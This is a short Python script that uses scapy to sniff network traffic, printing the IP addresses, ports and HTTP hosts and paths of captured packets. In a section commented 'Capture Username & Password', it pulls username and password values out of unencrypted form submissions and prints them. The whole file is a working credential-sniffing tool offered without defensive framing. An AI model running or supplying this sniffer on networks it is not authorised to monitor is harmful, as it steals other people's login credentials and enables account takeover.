from scapy.all import sniff
from scapy.layers.inet import IP, TCP, UDP
from scapy.packet import Raw
from scapy.layers.http import HTTPRequest


def analyze_packet(packet):

    if packet.haslayer(IP):

        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        print("\n==============================")
        print("Source IP:", src_ip)
        print("Destination IP:", dst_ip)

        # TCP Traffic
        if packet.haslayer(TCP):
            print("Protocol: TCP")
            print("Source Port:", packet[TCP].sport)
            print("Destination Port:", packet[TCP].dport)

        # UDP Traffic
        elif packet.haslayer(UDP):
            print("Protocol: UDP")
            print("Source Port:", packet[UDP].sport)
            print("Destination Port:", packet[UDP].dport)

        # HTTP Request Detection
        if packet.haslayer(HTTPRequest):

            host = packet[HTTPRequest].Host.decode(errors="ignore")
            path = packet[HTTPRequest].Path.decode(errors="ignore")

            print("HTTP Request Detected")
            print("Website:", host)
            print("Page:", path)

        # Capture Username & Password
        if packet.haslayer(Raw):

            load = packet[Raw].load.decode(errors="ignore")

            if "username=" in load or "password=" in load or "tbUsername=" in load:

                data = load.split("&")

                for item in data:

                    if "username=" in item or "tbUsername=" in item:
                        print("username:", item.split("=")[1])

                    if "password=" in item or "tbPassword=" in item:
                        print("password:", item.split("=")[1])


print("Starting Network Traffic Capture...")

sniff(
    filter="tcp or udp",
    prn=analyze_packet,
    store=False
)
#ctrl+c to stop the packet capture
